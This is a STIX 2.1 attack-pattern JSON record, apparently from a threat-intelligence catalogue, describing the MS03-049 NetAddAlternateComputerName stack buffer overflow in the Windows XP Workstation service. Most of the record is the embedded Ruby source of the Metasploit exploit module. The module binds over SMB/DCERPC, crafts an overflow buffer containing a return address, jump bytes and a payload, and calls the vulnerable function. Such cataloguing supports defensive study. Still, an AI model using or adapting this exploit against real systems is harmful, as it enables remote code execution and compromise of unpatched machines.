{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03911346-ceb1-4de0-8050-c3add52b039f",
    "created": "2024-08-14T16:56:24.584479Z",
    "modified": "2024-08-14T16:56:24.584483Z",
    "name": "MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow",
    "description": " This module exploits a stack buffer overflow in the NetApi32 NetAddAlternateComputerName function using the Workstation service in Windows XP. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms03_049_netapi.rb",
            "external_id": "ms03_049_netapi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0812"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the NetApi32 NetAddAlternateComputerName\n        function using the Workstation service in Windows XP.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0812' ],\n          [ 'OSVDB', '11461' ],\n          [ 'BID', '9011' ],\n          [ 'MSB', 'MS03-049' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' =>  \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\" + [*(0x80..0x9f)].pack('C*'),\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'DefaultTarget'  => 0,\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0/SP1',\n            {\n              'Ret' => 0x71aa32ad # pop/pop/ret in ws2help.dll\n            }\n          ],\n        ],\n      'DisclosureDate' => '2003-11-11'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (BROWSER, WKSSVC)\", 'BROWSER']),\n      ])\n  end\n\n  def exploit\n\n    connect()\n    smb_login()\n\n    handle = dcerpc_handle(\n      '6bffd098-a112-3610-9833-46c3f87e345a', '1.0',\n      'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"]\n    )\n\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    print_status(\"Building the stub data...\")\n\n\n    name = rand_text_alphanumeric(5000)\n    name[3496, 4] = [target.ret].pack('V')\n    name[3492, 2] = \"\\xeb\\x06\"\n    name[3500, 5] = \"\\xe9\" + [-3505].pack('V')\n    name[0, payload.encoded.length] = payload.encoded\n\n    stub =\n      NDR.long(rand(0xffffffff)) +\n      NDR.UnicodeConformantVaryingString(\"\\\\\\\\#{datastore['RHOST']}\") +\n      NDR.long(rand(0xffffffff)) +\n      NDR.UnicodeConformantVaryingString(name) +\n      NDR.long(rand(0xffffffff)) +\n      NDR.UnicodeConformantVaryingString('') +\n      NDR.long(0) +\n      NDR.long(0)\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      dcerpc.call(0x1b, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n    rescue => e\n      if e.to_s !~ /STATUS_PIPE_DISCONNECTED/\n        raise e\n      end\n    end\n\n    # Cleanup\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-11-11",
    "x_mitre_platforms": [
        "win'"
    ]
}